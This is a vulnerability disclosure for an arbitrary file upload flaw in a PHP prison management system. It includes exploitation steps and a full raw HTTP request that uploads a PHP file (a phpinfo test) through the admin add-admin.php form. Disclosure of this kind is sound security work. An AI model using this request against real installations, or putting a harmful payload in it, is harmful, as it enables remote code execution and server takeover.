# Prison Management System Using PHP has arbitrary file upload vulnerability

BUG_Author:

AoBo Li

Affected version:

Prison Management System Using PHP V1.0

Vendor:

Fast5

Software:

https://www.sourcecodester.com/sql/17287/prison-management-system.html

Vulnerability File:

/Employee/edit-photo.php

/Admin/add-admin.php



Description:



**1. Vulnerability Description**

The application allows authenticated users to upload files to the server. However, the file upload mechanism does not properly validate the file types being uploaded. As a result, it is possible to upload executable files, which can then be executed on the server.

**2. Proof of Concept (PoC)**

The following steps demonstrate how to exploit the arbitrary file upload vulnerability:

1. **Log in as admin or user,if log in as admin goto add-admin.php, if log in as user goto edit-photo.php.they are same.**
2. **Navigate to the file upload feature.**
3. **Upload a malicious file with a disguised extension (e.g., 1.jpg).**
4. **Rename it to a malicious extension file (e.g., 1.php).**
5. **The application saves the file on the server without proper validation.**
6. **Access the uploaded file via a direct URL and execute it.**

![image-20240925204658976](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240925204658976.png)

The data packet is as follows

```
POST /prison/Admin/add-admin.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------356316614838182701192715677466
Content-Length: 828
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/prison/Admin/add-admin.php
Cookie: PHPSESSID=jrvn8lh2tgi6mdfm6qlpuastm1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

-----------------------------356316614838182701192715677466
Content-Disposition: form-data; name="txtusername"

test
-----------------------------356316614838182701192715677466
Content-Disposition: form-data; name="txtfullname"

test
-----------------------------356316614838182701192715677466
Content-Disposition: form-data; name="txtpassword"

test
-----------------------------356316614838182701192715677466
Content-Disposition: form-data; name="txtphone"

test
-----------------------------356316614838182701192715677466
Content-Disposition: form-data; name="avatar"; filename="1.php"
Content-Type: image/png
<?php
phpinfo()>
?>
-----------------------------356316614838182701192715677466
Content-Disposition: form-data; name="btncreate"


-----------------------------356316614838182701192715677466--

```

![image-20240925205346343](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240925205346343.png)

![image-20240925210016665](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240925210016665.png)

![image-20240925205632083](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240925205632083.png)



**3. Impact**



The impact of this vulnerability can be severe. An attacker can upload and execute arbitrary code on the server, leading to:

- Unauthorized access to the server.
- Data leakage or manipulation.
- Server compromise and potential lateral movement within the network.